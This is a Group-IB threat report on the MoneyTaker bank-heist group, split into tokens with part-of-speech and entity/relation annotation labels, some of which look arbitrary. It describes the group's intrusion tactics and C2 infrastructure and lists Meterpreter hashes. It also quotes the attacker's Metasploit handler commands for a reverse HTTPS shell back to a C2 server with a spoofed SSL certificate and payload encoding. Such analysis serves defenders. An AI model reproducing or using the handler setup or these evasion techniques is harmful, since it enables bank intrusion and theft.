1 CD O O
MoneyTaker NN O O
1.5 CD O O
YEARS NNS O O
OF IN O O
SILENT NNP O O
OPERATIONS NNP O O
December NNP O O
2017 CD O O
www.group-ib.com NN O O
2 CD O O
TABLE NN O O
OF IN O O
CONTENTS NNP O O
Summary JJ O O
Attack NN O O
infrastructure NN O O
Provision NN O O
of IN O O
the DT O O
malware NN O O
survivability NN O O
Propagation NN O O
across IN O O
the DT O O
network NN O O
Spying VBG O O
on IN O O
legitimate JJ O O
users NNS O O
Attack NN O O
on IN O O
AWS NNP O O
CBR NNP O O
Potential JJ O O
attacks NNS O O
on IN O O
SWIFT NNP O O
Attack NN O O
on IN O O
card NN O O
processing NN O O
Using VBG O O
banking NN B-Entity 1
Trojans NNS I-Entity O
Using VBG I-Entity O
POS NNP I-Entity O
Trojans NNPS I-Entity O
Recommendations NNS I-Entity O
Indicators NNS I-Entity O
of IN I-Entity O
compromise NN I-Entity O
3 CD I-Entity O
7 CD I-Entity O
11 CD I-Entity O
12 CD I-Entity O
15 CD I-Entity O
19 CD I-Entity O
25 CD I-Entity O
26 CD I-Entity O
27 CD I-Entity O
28 CD I-Entity O
29 CD I-Entity O
31 CD I-Entity O
SUMMARY CD I-Entity O
01 CD I-Entity O
From NN I-Entity O
May NNP I-Entity O
2016 CD I-Entity O
to TO I-Entity O
November NNP I-Entity O
2017 CD I-Entity O
, , O O
at IN O O
least JJS O O
20 CD O O
organisations NNS O O
were VBD O O
attacked VBN O O
in IN O O
the DT O O
United NNP O O
States NNS O O
, , O O
UK NNP O O
and CC O O
Russia NNP O O
. . O O

At IN O O
least JJS O O
one CD O O
of IN O O
the DT O O
US NNP O O
banks NNS O O
was VBD O O
successfully RB O O
robbed VBN O O
twice RB O O
. . O O

In IN O O
addition NN O O
to TO O O
money NN O O
, , O O
attackers NNS O O
stole JJ O O
documentation NN O O
related VBD O O
to TO O O
the DT O O
interbank NN O O
payment NN O O
systems NNS O O
, , O O
which WDT O O
appear VBP O O
to TO O O
have VB O O
been VBN O O
obtained VBN O O
to TO O O
prepare VB O O
further JJ O O
attacks NNS O O
. . O O

Based VBN O O
on IN O O
analysis NN O O
of IN O O
these DT O O
incidents NNS O O
, , O O
attack NN O O
tools NNS O O
and CC O O
the DT O O
tactics NNS O O
applied VBN O O
, , O O
we PRP O O
have VBP O O
concluded VBD O O
that IN O O
the DT O O
same JJ O O
group NN O O
, , O O
which WDT O O
Group-IB NNP O O
has VBZ O O
dubbed VBN O O
MoneyTaker NNP O O
( ( O O
after IN O O
the DT O O
malware NN O O
used VBN O O
) ) O O
is VBZ O O
behind IN O O
these DT O O
attacks NNS O O
. . O O

It PRP O O
is VBZ O O
interesting VBG O O
to TO O O
note VB O O
that IN O O
despite IN O O
the DT O O
effectiveness NN O O
of IN O O
the DT O O
attacks NNS O O
, , O O
they PRP B-Entity 1
have VBP O O
gone VBN O O
completely RB O O
unreported JJ O O
till NN O O
now RB O O
. . O O

3 CD O O
Targets NNS O O
• NN O O
In IN O O
total JJ O O
Group-IB NNP O O
has VBZ O O
confirmed VBN O O
at IN O O
least JJS O O
20 CD O O
companies NNS O O
as IN O O
victims NNS O O
of IN O O
the DT O O
MoneyTaker NNP O O
group NN O O
, , O O
16 CD O O
of IN O O
which WDT O O
are VBP O O
located VBN O O
in IN O O
the DT O O
US NNP O O
. . O O

The DT O O
vast JJ O O
majority NN O O
of IN O O
them PRP O O
are VBP O O
small JJ O O
community NN O O
banks NNS O O
, , O O
where WRB O O
hackers NNS O O
attacked VBD O O
card JJ O O
processing NN O O
systems NNS O O
. . O O

The DT O O
average JJ O O
damage NN O O
from IN O O
each DT O O
successful JJ O O
attack NN O O
was VBD O O
500,000 CD O O
USD NNP O O
baseline NN O O
. . O O

• JJ O O
Criminals NNP O O
stole NN O O
documentation NN O O
for IN O O
OceanSystems NNP O O
’ NNP O O
FedLink NNP O O
card NN O O
processing NN O O
system NN O O
, , O O
which WDT O O
is VBZ O O
used VBN O O
by IN O O
200 CD O O
banks NNS O O
in IN O O
Latin NNP O O
America NNP O O
and CC O O
the DT O O
US NNP O O
. . O O

We PRP O O
believe VBP O O
that IN O O
banks NNS O O
operating VBG O O
on IN O O
this DT O O
infrastructure NN O O
are VBP O O
at IN O O
risk NN O O
of IN O O
being VBG O O
amongst IN O O
the DT O O
next JJ O O
targets NNS O O
of IN O O
MoneyTaker NNP O O
group NN O O
. . O O

• NN O O
In IN O O
Russia NNP O O
, , O O
they PRP O O
focus VBP O O
on IN O O
attacks NNS O O
on IN O O
the DT O O
system NN O O
of IN O O
interbank NN O O
transfers NNS O O
AWS NNP O O
CBR NNP O O
( ( O O
Russian JJ O O
Interbank NNP O O
payment NN O O
system NN O O
) ) O O
. . O O

The DT O O
average JJ O O
amount NN O O
of IN O O
damage NN O O
caused VBN O O
by IN O O
this DT O O
theft NN O O
scheme NN O O
is VBZ O O
1.2 CD O O
million CD O O
USD NNP O O
per IN O O
incident NN O O
. . O O

That DT O O
said VBD O O
, , O O
the DT O O
affected JJ O O
banks NNS O O
managed VBN O O
to TO O O
return VB O O
some DT O O
portion NN O O
of IN O O
the DT O O
stolen VBN O O
money NN O O
. . O O

Tools NNS O O
and CC O O
tactics NNS O O
Attackers NNS O O
use VBP O O
both DT O O
borrowed NNS O O
and CC O O
their PRP$ O O
own JJ O O
self-written JJ O O
tools NNS O O
. . O O

When WRB O O
attacking VBG O O
, , O O
hackers NNS O O
act VBP O O
creatively RB O O
and CC O O
wisely RB O O
: : O O
they PRP O O
use VBP O O
« JJ O O
one- NN O O
time NN O O
» JJ O O
infrastructure NN O O
and CC O O
carefully RB O O
erase VB O O
traces NNS O O
of IN O O
their PRP$ O O
activity NN O O
post-incident NN O O
. . O O

Infiltration NN O O
• NN O O
To TO O O
penetrate VB O O
the DT O O
corporate JJ O O
network NN O O
, , O O
the DT O O
group NN O O
uses VBZ O O
legitimate VBP O O
pen JJ O O
testing NN O O
tools NNS O O
- : O O
Metasploit NNP O O
and CC O O
PowerShell NNP O O
Empire NNP O O
. . O O

• NN O O
After IN O O
successful JJ O O
infection NN O O
, , O O
they PRP O O
carefully RB O O
erase VBP O O
malware NN O O
traces NNS O O
. . O O

However RB O O
, , O O
when WRB O O
investigating VBG O O
one CD O O
of IN O O
the DT O O
incidents NNS O O
, , O O
we PRP O O
managed VBN O O
to TO O O
discover VB O O
the DT O O
initial JJ O O
point NN O O
of IN O O
compromise NN O O
: : O O
hackers NNS O O
penetrated VBD O O
the DT O O
bank NN O O
’ NNP O O
s VBZ O O
internal JJ O O
network NN O O
by IN O O
gaining VBG O O
access NN O O
to TO O O
the DT O O
home NN O O
computer NN O O
of IN O O
the DT O O
bank NN O O
’ NNP O O
s NN O O
system NN O O
administrator NN O O
. . O O

Stealthy NNP B-Entity 1
techniques NNS I-Entity O
• IN B-Modifier 2
The DT B-Entity 3
group NN I-Entity O
uses VBZ I-Entity O
‘ NNP I-Entity O
fileless NN I-Entity O
’ NNP I-Entity O
malware NN I-Entity O
which WDT O O
only RB O O
exists VBZ O O
in IN O O
RAM NNP O O
and CC O O
is VBZ O O
removed VBN O O
on IN O O
rebooting NN O O
. . O O

4 CD O O
• NN O O
To TO O O
protect VB O O
C NNP O O
& CC O O
C NNP O O
communications NNS O O
from IN O O
being VBG O O
detected VBN O O
by IN O O
security NN O O
teams NNS O O
, , O O
hackers NNS O O
employ VBP O O
SSL NNP O O
certificates NNS O O
generated VBD O O
using VBG O O
names NNS O O
of IN O O
well-known JJ O O
brands NNS O O
: : O O
Bank NNP O O
of IN O O
America NNP O O
, , O O
Federal NNP O O
Reserve NNP O O
Bank NNP O O
, , O O
Microsoft NNP O O
, , O O
Yahoo NNP O O
, , O O
etc NN O O
. . O O

• NN B-Entity 1
Servers NNS I-Entity O
used VBD B-Action 2
to TO B-Modifier 3
perform VB B-Entity 4
initial JJ I-Entity O
infection NN I-Entity O
are VBP B-Action 5
one-time JJ B-Entity 6
components NNS I-Entity O
which WDT I-Entity O
are VBP I-Entity O
changed VBN I-Entity O
immediately RB I-Entity O
after IN I-Entity O
a DT I-Entity O
successful JJ I-Entity O
infection NN I-Entity O
. . O O

Attack NN B-Entity 1
tools NNS I-Entity O
Members NNS I-Entity O
of IN I-Entity O
the DT I-Entity O
group NN I-Entity O
are VBP O O
skilled VBN O O
enough RB O O
to TO O O
promptly RB O O
adjust VB O O
the DT O O
tools NNS O O
applied VBD O O
. . O O

In IN O O
some DT O O
cases NNS O O
, , O O
they PRP O O
made VBD O O
changes NNS O O
to TO O O
the DT O O
source NN O O
code NN O O
‘ NN O O
on IN O O
the DT O O
fly NN O O
’ SYM O O
- : O O
during IN O O
the DT O O
attack NN O O
. . O O

Created VBN B-Entity 1
tools NNS I-Entity O
Borrowed NNP I-Entity O
tools NNS I-Entity O
MoneyTaker NNP I-Entity O
5.0 CD I-Entity O
- : I-Entity O
malicious JJ I-Entity O
program NN I-Entity O
for IN B-Modifier 2
auto NN B-Entity 3
replacement NN I-Entity O
of IN I-Entity O
payment NN I-Entity O
data NNS I-Entity O
in IN O O
AWS NNP O O
CBR NNP O O
‘ JJ O O
Screenshotter NNP O O
’ NNP O O
and CC O O
‘ NNP O O
keylogger NNP O O
’ NNP O O
to TO O O
conduct NN O O
espionage NN O O
and CC O O
capture NN O O
keystrokes NNS O O
Metasploit NNP O O
and CC O O
PowerShell NNP O O
Empire NNP O O
Privilege NNP O O
escalation NN O O
tools NNS O O
, , O O
whose WP$ O O
code NN O O
were VBD O O
demonstrated VBN O O
as IN O O
a DT O O
Proof NNP O O
of IN O O
Concept NNP O O
at IN O O
ZeroNights NNP O O
cybersecurity NN O O
conference NN O O
in IN O O
Moscow NNP O O
in IN O O
2016 CD O O
. . O O

More JJR O O
data NNS O O
provided VBD O O
later RBR O O
in IN O O
this DT O O
report NN O O
Moneytaker NNP O O
‘ NNP O O
Auto-replacement NNP O O
’ NN O O
program NN O O
to TO O O
substitute VB B-Action 1
payment NN B-Entity 2
details NNS I-Entity O
in IN I-Entity O
the DT I-Entity O
interbank NN I-Entity O
transfer NN I-Entity O
system NN I-Entity O
Citadel NNP I-Entity O
and CC I-Entity O
Kronos NNP I-Entity O
Banking NNP I-Entity O
Trojans NNPS I-Entity O
. . O O

The DT O O
latter RB O O
one CD O O
was VBD O O
used VBN O O
to TO O O
deliver VB O O
a DT O O
Point-of-Sale JJ O O
( ( O O
POS NNP O O
) ) O O
malware NN O O
dubbed VBN O O
ScanPOS NNP O O
Tracking VBG O O
the DT O O
attacks NNS O O
• NN O O
Servers NNS O O
used VBD O O
to TO O O
conduct VB O O
the DT O O
attacks NNS O O
were VBD O O
specifically RB O O
configured VBN O O
to TO O O
deliver VB O O
the DT O O
malicious JJ O O
payload NN O O
to TO O O
a DT O O
pre- NN O O
determined JJ O O
list NN O O
of IN O O
IP NNP O O
addresses VBZ O O
belonging VBG O O
to TO O O
the DT O O
target NN O O
company NN O O
. . O O

This DT O O
methodology NN O O
was VBD O O
employed VBN O O
by IN O O
attackers NNS O O
to TO O O
prevent NN O O
the DT O O
payload NN O O
from IN O O
falling VBG O O
into IN O O
the DT O O
hands NNS O O
of IN O O
security NN O O
analysts NNS O O
and CC O O
experts NNS O O
. . O O

• NN O O
After IN O O
each DT O O
round NN O O
of IN O O
attacks NNS O O
, , O O
hackers NNS O O
deploy VBP O O
new JJ O O
infrastructure NN O O
for IN O O
network NN O O
persistence NN O O
. . O O

• NN O O
In IN O O
detected JJ O O
incidents NNS O O
, , O O
criminals NNS B-Entity 1
used VBD B-Action 2
a DT B-Entity 3
program NN I-Entity O
that WDT O O
should MD O O
have VB O O
carefully RB O O
removed VBN O O
all DT O O
components NNS O O
of IN O O
the DT O O
programs NNS O O
applied VBN O O
. . O O

However RB O O
, , O O
due JJ O O
to TO O O
an DT O O
error NN O O
made VBN O O
by IN O O
the DT O O
developer NN O O
, , O O
the DT O O
data NNS O O
were VBD O O
not RB O O
deleted VBN O O
from IN O O
the DT O O
attacked JJ O O
machines NNS O O
, , O O
which WDT O O
enabled VBN O O
forensic JJ O O
experts NNS O O
to TO O O
learn VB O O
details NNS O O
of IN O O
the DT O O
hackers NNS O O
’ VBP O O
activity NN O O
. . O O

5 CD O O
Interrelations NNS O O
between IN O O
incidents NNS O O
In IN O O
1.5 CD O O
years NNS O O
, , O O
Group-IB NNP O O
confirmed VBD O O
20 CD O O
incidents NNS O O
in IN O O
total NN O O
. . O O

Initially RB O O
we PRP O O
divided VBD O O
these DT O O
incidents NNS O O
into IN O O
three CD O O
groups NNS O O
and CC O O
considered VBN O O
them PRP O O
as IN O O
separate NN O O
. . O O

However RB O O
, , O O
through IN O O
in-depth JJ O O
investigation NN O O
of IN O O
the DT O O
infrastructure NN O O
, , O O
tools NNS O O
, , O O
and CC O O
tactics NNS O O
applied VBN O O
, , O O
which WDT O O
will MD O O
be VB O O
further JJ O O
covered VBN O O
in IN O O
this DT O O
report NN O O
, , O O
we PRP O O
have VBP O O
concluded VBN O O
that IN O O
one CD O O
group NN O O
is VBZ O O
behind IN O O
all PDT O O
these DT O O
attacks NNS O O
– VBP O O
MoneyTaker NNP O O
. . O O

This DT O O
is VBZ O O
supported VBN O O
by IN O O
technical JJ O O
analysis NN O O
provided VBD O O
later RB O O
in IN O O
this DT O O
report NN O O
: : O O
Group NNP O O
1 CD O O
Group NNP O O
2 CD O O
Group NNP O O
3 CD O O
17 CD O O
incidents NNS O O
in IN O O
US NNP O O
and CC O O
UK NNP O O
organizations NNS O O
. . O O

In IN O O
the DT O O
majority NN O O
of IN O O
instances NNS O O
, , O O
hackers NNS O O
used VBD O O
the DT O O
same JJ O O
C NNP O O
& CC O O
C NNP O O
server NN O O
to TO O O
control VB B-Action 1
the DT B-Entity 2
initial JJ I-Entity O
part NN I-Entity O
of IN I-Entity O
their PRP$ I-Entity O
attacks NNS I-Entity O
. . O O

In IN O O
some DT O O
cases NNS O O
, , O O
we PRP O O
saw VBD O O
a DT O O
similar JJ O O
use NN O O
of IN O O
the DT O O
infrastructure NN O O
from IN O O
which WDT O O
remote VBP O O
connections NNS O O
were VBD O O
performed VBN O O
using VBG O O
LogMeIn NNP O O
. . O O

Common JJ O O
features NNS O O
of IN O O
Groups NNP O O
1-3 JJ O O
2 CD O O
incidents NNS O O
occurred VBD O O
in IN O O
Russia NNP O O
in IN O O
the DT O O
autumn NN O O
of IN O O
2016 CD O O
. . O O

The DT O O
two CD O O
attacks NNS O O
occurred VBD O O
at IN O O
the DT O O
same JJ O O
time NN O O
; : O O
in IN O O
both DT O O
cases NNS O O
Meterpreter NNP O O
was VBD O O
used VBN O O
to TO O O
attack VB O O
the DT O O
same JJ O O
target NN O O
– JJ O O
servers NNS O O
of IN O O
the DT O O
Russian JJ O O
interbank NN O O
transfer NN O O
system NN O O
( ( O O
AWS NNP O O
CBR NNP O O
) ) O O
. . O O

1 CD O O
incident NN O O
in IN O O
Russia NNP O O
in IN O O
the DT O O
autumn NN O O
of IN O O
2017 CD O O
. . O O

The DT O O
attack NN O O
was VBD O O
conducted VBN O O
on IN O O
the DT O O
AWS NNP O O
CBR NNP O O
using VBG O O
Meterpreter NNP O O
. . O O

• NN O O
Metasploit NNP O O
used VBD O O
to TO O O
infiltrate VB O O
corporate JJ O O
networks NNS O O
• JJ O O
SSL NNP O O
certificates NNS O O
generated VBD O O
using VBG O O
popular JJ O O
brands NNS O O
to TO O O
protect VB O O
traffic NN O O
between IN O O
Meterpreter NNP O O
and CC O O
C NNP O O
& CC O O
C NNP O O
• JJ O O
Russian-speaking JJ O O
attackers NNS O O
• RB O O
Own NNP O O
developers NNS O O
who WP O O
create VBP O O
unique JJ O O
tools NNS O O
• JJ O O
Modification NNP O O
of IN O O
the DT O O
malicious JJ O O
code NN O O
during IN O O
attack NN O O
• NN O O
Covering VBG O O
tracks NNS O O
of IN O O
the DT O O
initial JJ O O
infection NN O O
vector NN O O
• NN O O
Setting VBG O O
up RP O O
forwarding VBG O O
corporate JJ O O
emails NNS O O
to TO O O
Yandex NNP O O
and CC O O
Mail.ru NNP O O
, , O O
free JJ O O
mail NN O O
services NNS O O
. . O O

Common JJ O O
features NNS O O
of IN O O
Groups NNP O O
2 CD O O
and CC O O
3 CD O O
• RB O O
Originally RB O O
targeted VBN O O
AWS NNP O O
CBR NNP O O
in IN O O
Russia NNP O O
• NN O O
Using VBG O O
domains NNS O O
in IN O O
the DT O O
.ga NNP O O
zone NN O O
• NN O O
Similar NNP O O
manner NN O O
of IN O O
propagation NN O O
across IN O O
the DT O O
network NN O O
. . O O

• IN O O
The DT O O
same JJ O O
hosting NN O O
service NN O O
used VBN O O
in IN O O
the DT O O
incidents NNS O O
in IN O O
2016 CD O O
and CC O O
2017 CD O O
Common JJ O O
features NNS O O
of IN O O
Groups NNP O O
1 CD O O
and CC O O
2 CD O O
In IN O O
both DT O O
groups NNS O O
of IN O O
incidents NNS O O
, , O O
UltraVNC NNP O O
1.1.9.4 CD O O
was VBD O O
used VBN O O
. . O O

This DT O O
version NN O O
was VBD O O
available JJ O O
back RB O O
in IN O O
2013 CD O O
. . O O

The DT B-Entity 1
current JJ I-Entity O
version NN I-Entity O
of IN I-Entity O
this DT I-Entity O
remote NN I-Entity O
access NN I-Entity O
tool NN I-Entity O
was VBD I-Entity O
1.2.0.6 CD I-Entity O
at IN I-Entity O
the DT I-Entity O
time NN I-Entity O
of IN I-Entity O
attacks NNS I-Entity O
in IN I-Entity O
Russia NNP I-Entity O
and CC I-Entity O
the DT I-Entity O
US NNP I-Entity O
. . O O

6 CD O O
Software NNP O O
& CC O O
service NN O O
provider NN O O
, , O O
UK NNP O O
US NNP O O
Financial NNP O O
Services NNPS O O
Provider NN O O
( ( O O
Breach NNP O O
not RB O O
confirmed VBD O O
) ) O O
Bank NNP O O
, , O O
Russia NNP O O
Bank NNP O O
, , O O
Russia NNP O O
AWS NNP O O
CBR NNP O O
2016 CD O O
Bank NNP O O
, , O O
USA NNP O O
First NNP O O
Data NNP O O
STAR NNP O O
JANUARY NN O O
FEBRUARY NN O O
MARCH NN O O
APRIL NN O O
MAY NNP O O
JUNE NN O O
JULY NN O O
AUGUST NNP O O
SEPTEMBER NN O O
OCTOBER NN O O
NOVEMBER NN O O
DECEMBER NN O O
Bank NNP O O
, , O O
USA NNP O O
, , O O
UT NNP O O
Bank NNP O O
, , O O
USA NNP O O
, , O O
NY NNP O O
Bank NNP O O
, , O O
USA NNP O O
, , O O
VA NNP O O
Bank NNP O O
, , O O
USA NNP O O
, , O O
CO NNP O O
Bank NNP O O
, , O O
USA NNP O O
, , O O
FL NNP O O
Bank NNP O O
, , O O
USA NNP O O
, , O O
SC NNP O O
Credit NNP O O
Union NNP O O
, , O O
USA NNP O O
2017 CD O O
Bank NNP O O
, , O O
USA NNP O O
, , O O
IL NNP O O
Bank NNP O O
, , O O
USA NNP O O
, , O O
IL NNP O O
Bank NNP O O
, , O O
USA NNP O O
, , O O
WI NNP O O
Bank NNP O O
, , O O
USA NNP O O
, , O O
OK NNP O O
Bank NNP O O
, , O O
Russia NNP O O
AWS NNP O O
CBR NNP O O
JANUARY NN O O
FEBRUARY NN O O
MARCH NN O O
APRIL NN O O
MAY NNP O O
JUNE NN O O
JULY NN O O
AUGUST NNP O O
SEPTEMBER NN O O
OCTOBER NN O O
NOVEMBER NN O O
DECEMBER NN O O
Bank NNP O O
, , O O
USA NNP O O
, , O O
MO NNP O O
Bank NNP O O
, , O O
USA NNP O O
, , O O
CA NNP O O
Law NNP O O
Firm NN O O
, , O O
USA NNP O O
, , O O
NC NNP O O
Bank NNP O O
, , O O
USA NNP O O
, , O O
CA NNP O O
Timeline NN O O
of IN O O
initial JJ O O
infections NNS O O
in IN O O
attacks NNS O O
: : O O
• IN O O
The DT O O
very RB O O
first JJ O O
attack NN O O
, , O O
which WDT O O
Group-IB NNP O O
attributes VBZ O O
to TO O O
MoneyTaker NNP O O
was VBD O O
conducted VBN O O
in IN O O
the DT O O
spring NN O O
of IN O O
2016 CD O O
, , O O
when WRB O O
funds NNS O O
were VBD O O
stolen VBN O O
from IN O O
a DT O O
US NNP O O
bank NN O O
by IN O O
gaining VBG O O
access NN O O
to TO O O
First NNP O O
Data NNP O O
’ NNP O O
s NN O O
STAR NNP O O
card NN O O
processing NN O O
system NN O O
. . O O

• NN O O
• NN O O
• NN O O
In IN O O
September NNP O O
2016 CD O O
, , O O
Group-IB NNP O O
tracked VBD O O
several JJ O O
attacks NNS O O
on IN O O
banks NNS O O
in IN O O
Russia NNP O O
. . O O

The DT O O
main JJ O O
target NN O O
was VBD O O
the DT O O
AWS NNP O O
CBR NNP O O
( ( O O
Automated NNP O O
Work NNP O O
Station NNP O O
Client NNP O O
of IN O O
the DT O O
Russian JJ O O
Central NNP O O
Bank NNP O O
) ) O O
, , O O
a DT B-Entity 1
Russian JJ I-Entity O
interbank NN I-Entity O
fund NN I-Entity O
transfer NN I-Entity O
system NN I-Entity O
similar JJ I-Entity O
to TO I-Entity O
SWIFT NNP I-Entity O
. . O O

After IN O O
a DT O O
successful JJ O O
theft NN O O
from IN O O
one CD O O
of IN O O
the DT O O
attacked JJ O O
banks NNS O O
, , O O
the DT O O
incidents NNS O O
stopped VBD O O
, , O O
similar JJ O O
to TO O O
the DT O O
case NN O O
of IN O O
theft NN O O
in IN O O
the DT O O
United NNP O O
States NNPS O O
. . O O

In IN O O
November NNP O O
2016 CD O O
, , O O
attackers NNS O O
deployed VBD O O
new JJ O O
infrastructure NN O O
, , O O
which WDT O O
was VBD O O
then RB O O
used VBN O O
to TO O O
attack VB O O
banks NNS O O
in IN O O
the DT O O
United NNP O O
States NNPS O O
. . O O

The DT O O
last JJ O O
activity NN O O
in IN O O
this DT O O
wave NN O O
of IN O O
attacks NNS O O
was VBD O O
tracked VBN O O
in IN O O
June NNP O O
2017 CD O O
. . O O

In IN O O
November NNP O O
2017 CD O O
, , O O
we PRP O O
observed VBD O O
a DT O O
new JJ O O
successful JJ O O
attack NN O O
by IN O O
this DT O O
group NN O O
in IN O O
Russia NNP O O
. . O O

Like IN O O
in IN O O
2016 CD O O
, , O O
they PRP O O
managed VBD O O
to TO O O
steal VB O O
funds NNS O O
through IN O O
the DT O O
interbank NN O O
transfers NNS O O
system NN O O
. . O O

7 CD O O
02 CD O O
ATTACK NN O O
INFRASTRUCTURE NN O O
To TO O O
conduct VB O O
targeted JJ O O
attacks NNS O O
, , O O
hackers NNS O O
use VBP O O
a DT O O
distributed JJ O O
infrastructure NN O O
that WDT O O
is VBZ O O
difficult JJ O O
to TO O O
track VB O O
. . O O

A DT O O
rather RB O O
unique JJ O O
feature NN O O
of IN O O
the DT O O
infrastructure NN O O
is VBZ O O
the DT O O
presence NN O O
of IN O O
a DT O O
Persistence NN O O
server NN O O
, , O O
which WDT O O
delivers VBZ O O
the DT O O
payload NN O O
only RB O O
to TO O O
real JJ O O
victims NNS O O
whose WP$ O O
IP NNP O O
addresses NNS O O
are VBP O O
added VBN O O
to TO O O
the DT O O
whitelist NN O O
. . O O

1 CD B-Entity 1
2 CD I-Entity O
3 CD I-Entity O
4 CD I-Entity O
5 CD I-Entity O
Stager NNP I-Entity O
request NN I-Entity O
payload NN I-Entity O
Payload NN I-Entity O
Setup NNP I-Entity O
encrypted VBD I-Entity O
tunnel NN I-Entity O
with IN I-Entity O
backconnect NN I-Entity O
Request NNP I-Entity O
stager NN I-Entity O
after IN B-Modifier 2
reboot NN B-Entity 3
Response NN I-Entity O
with IN I-Entity O
stager NN I-Entity O
if IN I-Entity O
IP NNP I-Entity O
in IN I-Entity O
whitelist NN I-Entity O
Pentest NNP I-Entity O
framework NN I-Entity O
and CC I-Entity O
backconnect VB I-Entity O
server NN I-Entity O
Persistence NN I-Entity O
server NN I-Entity O
( ( I-Entity O
response NN I-Entity O
to TO I-Entity O
whitelisted VBN I-Entity O
IPs NNP I-Entity O
) ) I-Entity O
VICTIM NN I-Entity O
Pentest NNP I-Entity O
framework NN I-Entity O
server NN I-Entity O
This DT I-Entity O
server NN I-Entity O
is VBZ O O
used VBN O O
to TO O O
perform VB O O
the DT O O
main JJ O O
activity NN O O
. . O O

On IN O O
it PRP O O
, , O O
hackers NNS O O
install VB O O
a DT O O
legitimate JJ O O
tool NN O O
for IN O O
penetration NN O O
testing VBG O O
- : O O
Metasploit NN O O
to TO O O
further RB O O
control VB O O
the DT O O
full JJ O O
attack NN O O
. . O O

8 CD O O
Name NN O O
asys.exe NN O O
launch-paranoid- NN O O
stageless3.exe NN O O
SHA256 NN O O
Type NN O O
6ce7c4cb9e51116a4565e9b2e129335a4d23cfc51a32080aa9f25689cb1c6ef2 CD O O
Meterpreter NN O O
f98b0220a11b57e3c812e7f86f5e5c3f8bbdb5d5ce9dc7b721e28a7f28ecb1ef NN O O
Meterpreter NN O O
msc.exe NN O O
, , O O
msc3.exe NN B-Entity 1
0b778857bbc4ec36020d021f475ff90550134beb9506c53071652421e10ddfff CD I-Entity O
Meterpreter NN I-Entity O
msc4.exe NN I-Entity O
msc5.exe NN I-Entity O
msc6.exe NN I-Entity O
msc7.exe NN I-Entity O
cmd.exe NN I-Entity O
53c789565821b6eb64bd7f002e38b8259bde3bbbb39798c82657b2b5d59bcd9f CD I-Entity O
Meterpreter NN I-Entity O
98fb846df3687b3c9c7fa66f39d6c70948e8330489be7c787e1f2c3b23f8d205 CD I-Entity O
Meterpreter NN I-Entity O
92afe22f494a849345b18d2b302e71a4336871a7956795a7188280e4c7bd8607 CD I-Entity O
Meterpreter NN I-Entity O
73b8ed8f14ec2260ae332603f723a5eb0a52c4c997454904e3d5ff254a27a6e6 CD I-Entity O
Meterpreter NN I-Entity O
7eef88e4b0d5ad549d18629f4491088d5d328d7bcaab8ce68216a331b284d43f CD I-Entity O
Meterpreter NNP I-Entity O
stager NN I-Entity O
mencstager.exe NN I-Entity O
7eef88e4b0d5ad549d18629f4491088d5d328d7bcaab8ce68216a331b284d43f CD I-Entity O
Meterpreter NNP I-Entity O
stager NN I-Entity O
msdefender.bat NN I-Entity O
8cfeb71eaaa3df217e15a449bc4656841b58a4737760d956b1c8e6039cff61e6 CD I-Entity O
Meterpreter NNP I-Entity O
stager NN I-Entity O
se.vbs NN I-Entity O
rc4.dll NN I-Entity O
rc4.exe NN I-Entity O
rc4.hta NN I-Entity O
ff999c968bce81987cab47a02a3b176042489d82644d4c6fb13d5c8c1244cbcc NN I-Entity O
Meterpreter NNP I-Entity O
stager NN I-Entity O
8a0be0a97ba19d4498b58365d36ba5461039e41f73bbd745b15b80fc21e38c3f CD I-Entity O
Meterpreter NNP I-Entity O
stager NN I-Entity O
a7035c20c32ad4cd1cc76b211f6258fc5858e4bc43031d04e3655b38b666c0c4 NN I-Entity O
Meterpreter NNP I-Entity O
stager NN I-Entity O
72ee03b51544002df3e25d1a730e650389bdbd5f1cff91488ed9e05944b3cb52 CD I-Entity O
Meterpreter NNP I-Entity O
stager NN I-Entity O
proxystager.bat NN I-Entity O
3a163bb0a8abe244815836a05fab48b640ec537bd76c92b7857db18657d2a774 CD I-Entity O
Meterpreter NNP I-Entity O
stager NN I-Entity O
ps.bat NN I-Entity O
9e9149ae6092c4a5bd4cb36cf40ec660e3ee10e76834340bf1234186315ca808 CD I-Entity O
Meterpreter NNP I-Entity O
stager NN I-Entity O
When WRB I-Entity O
the DT I-Entity O
payload NN I-Entity O
( ( O O
Meterpreter NNP O O
) ) O O
runs VBZ O O
on IN O O
a DT O O
compromised JJ O O
host NN O O
, , O O
it PRP O O
initiates NNS O O
outbound RP O O
SSL NNP O O
connections NNS O O
which WDT O O
helps VBZ O O
to TO O O
avoid VB O O
detection NN O O
of IN O O
suspicious JJ O O
connections NNS O O
by IN O O
network NN O O
security NN O O
systems NNS O O
. . O O

Below NNP O O
is VBZ O O
code NN O O
executed VBD O O
within IN O O
the DT O O
Metasploit NNP O O
console NN O O
by IN O O
the DT B-Entity 1
attacker NN I-Entity O
: : I-Entity O
use NN I-Entity O
exploit/multi/handler NN I-Entity O
set VBN I-Entity O
PAYLOAD NNP I-Entity O
windows/meterpreter/reverse JJ I-Entity O
_ NNP I-Entity O
https NN I-Entity O
set VBN I-Entity O
LHOST NNP I-Entity O
_ NNP I-Entity O
c2serverIP NN I-Entity O
_ NN I-Entity O
set VBN I-Entity O
LPORT NNP I-Entity O
443 CD I-Entity O
set VBN I-Entity O
HandlerSSLCert NNP I-Entity O
/root/.msf4/loot/20161031010327 NNP I-Entity O
_ NN I-Entity O
default NN I-Entity O
_ $ I-Entity O
46.228.47.114 CD I-Entity O
_ NNP I-Entity O
www.yahoo.com NN I-Entity O
_ NNP I-Entity O
pe NN I-Entity O
_ VBD I-Entity O
399345.pem CD I-Entity O
set VBN I-Entity O
StagerVerifySSLCert NNP I-Entity O
true JJ I-Entity O
set VBN I-Entity O
EnableStageEncoding NNP I-Entity O
true JJ I-Entity O
set VBN I-Entity O
StageEncoder NNP I-Entity O
x86/shikata NNP I-Entity O
_ NNP I-Entity O
ga NN I-Entity O
_ NNP I-Entity O
nai NN I-Entity O
set VBN O O
ExitOnSession NNP O O
false JJ O O
By IN O O
default NN O O
, , O O
Metasploit NNP O O
generates VBZ O O
self-signed JJ O O
SSL NNP O O
certificates NNS O O
and CC O O
specifies NNS O O
random VBP O O
values NNS O O
in IN O O
the DT O O
following JJ O O
fields NNS O O
: : O O
Valid NNP O O
from IN O O
, , O O
Valid NNP O O
till NN O O
, , O O
Common NNP O O
name NN O O
. . O O

Such JJ O O
certificates NNS O O
can MD O O
also RB O O
cause VB O O
suspicion NN O O
. . O O

9 CD O O
In IN O O
order NN O O
to TO O O
avoid VB O O
detection NN O O
, , O O
the DT O O
MoneyTaker NNP O O
group NN O O
generates VBZ O O
self- JJ O O
